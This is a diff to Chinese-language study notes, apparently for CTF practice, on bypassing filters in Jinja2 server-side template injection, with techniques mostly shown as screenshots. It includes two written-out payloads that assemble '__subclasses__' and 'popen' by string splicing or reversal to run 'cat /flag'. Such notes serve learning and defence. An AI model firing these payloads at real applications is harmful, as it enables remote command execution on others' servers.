@@ -421,7 +421,7 @@ payload:
 
 使用attr()来进行绕过
 
-
+1.使用request方法
 
 payload:
 
@@ -430,3 +430,109 @@ payload:
 再使用GET传参:
 
 `?k1=__class__&k2=__base__&k3=__subclasses__&k4=__getitem__&k5=__init__&k6=__globals__`
+
+
+
+2.使用unicode编码
+
+![image-20240423171559608](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423171559608.png)
+
+
+
+3.使用16位编码
+
+![image-20240423171656797](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423171656797.png)
+
+下划线全都用`\x5f`来代替
+
+
+
+4.base64编码(python3中不可行)
+
+![image-20240423171802252](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423171802252.png)
+
+
+
+5.格式化字符串
+
+![image-20240423172103988](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240423172103988.png)
+
+
+
+# 中括号绕过点过滤
+
+## attr()绕过
+
+见上面
+
+
+
+## 中括号[]代替点
+
+python语法也可以使用`[]`来访问对象属性
+
+![image-20240424220844727](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424220844727.png)
+
+
+
+# 关键字过滤
+
+![image-20240424221107979](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424221107979.png)
+
+## 编码绕过
+
+见上面
+
+
+
+## '+'拼接
+
+**注意:**使用拼接绕过关键字时,`.`好像不可以用,要使用`[]`代替
+
+![image-20240424223454184](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424223454184.png)
+
+
+
+## '~'拼接
+
+![image-20240424224050017](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424224050017.png)
+
+实战时发现hackbar上上传post参数会报错(可能是编码问题),在实际页面的框中上传即可
+
+![image-20240424224203517](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424224203517.png)
+
+
+
+
+
+```
+{% set a='__cla' %}{% set b='ss__' %}{% set c='__ba' %}{% set d='se__' %}{% set e='__subcl' %}{% set f='asses__' %}{% set g='__in' %}{% set h='it__' %}{% set l='__gl' %}{% set i='obals__' %}{% set j='po' %}{% set k='pen' %}{{''[a~b][c~d][e~f]()[199][g~h][l~i]['os'][j~k]('cat /flag')['read']()}}
+```
+
+
+
+## 过滤器
+
+![image-20240424230305874](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424230305874.png)
+
+```
+{% set a='__ssalc__'|reverse %}{% set b='__esab__'|reverse %}{% set c='__sessalcbus__'|reverse %}{% set d='__tini__'|reverse %}{% set e='__slabolg__'|reverse %}{% set f='nepop'|reverse %}{{''[a][b][c]()[199][d][e]['os'][f]('cat /flag')['read']()}}
+```
+
+
+
+其他过滤器:
+
+![image-20240424231127574](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424231127574.png)
+
+
+
+## 利用python中的char
+
+![image-20240424231148935](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424231148935.png)
+
+
+
+# length过滤器绕过数字过滤
+
+![image-20240424231325079](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240424231325079.png)
